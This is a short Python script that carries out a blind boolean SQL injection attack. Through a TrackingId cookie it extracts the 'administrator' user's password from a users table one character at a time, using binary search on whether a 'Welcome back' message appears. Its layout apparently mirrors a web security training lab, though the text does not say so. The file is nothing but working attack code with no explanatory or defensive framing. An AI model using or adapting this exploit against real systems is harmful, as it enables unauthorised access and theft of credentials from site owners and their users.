import string
import requests
import os
from dotenv import load_dotenv
import time

load_dotenv()

DEFAULT_URL = os.getenv('DEFAULT_URL', '')
TRACKING_ID = os.getenv('TRACKING_ID', '')
SESSION = os.getenv('SESSION', '')
REFERER = os.getenv('REFERER', '')

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Referer': REFERER
})
session.cookies.set('session', SESSION)


AVAILABLE_CHARACTERS = sorted(string.printable)
SEARCHED_STRING = 'Welcome back'


def _is_less(password_index, checked_character):
    payload = f"{TRACKING_ID}' AND (SELECT SUBSTRING(password FROM {password_index} FOR 1) FROM users WHERE username='administrator')<'{checked_character}'--"
    response = session.get(DEFAULT_URL, cookies={ "TrackingId": payload})
    return SEARCHED_STRING in response.text


def _is_hit(password_index, checked_character):
    payload = f"{TRACKING_ID}' AND (SELECT SUBSTRING(password FROM {password_index} FOR 1) FROM users WHERE username='administrator')='{checked_character}'--"
    response = session.get(DEFAULT_URL, cookies={ "TrackingId": payload})
    return SEARCHED_STRING in response.text


def _find_char_for_index(password_index, start, stop):
    time.sleep(0.1) # slow down to prevent server failures

    if start > stop:
        return None

    checked_index = (start + stop) // 2
    checked_character = AVAILABLE_CHARACTERS[checked_index]

    if _is_less(password_index, checked_character):
        return _find_char_for_index(password_index, start, checked_index - 1)
    else:
        if _is_hit(password_index, checked_character):
            return checked_character
        else:
            return _find_char_for_index(password_index, checked_index + 1, stop)


def detect_password():
    password = ''
    char_index = 1

    while True:
        char = _find_char_for_index(char_index, 0, len(AVAILABLE_CHARACTERS) - 1)
        if not char:
            break
        else:
            password += char
            char_index += 1

    return password


password = detect_password()
print(password)

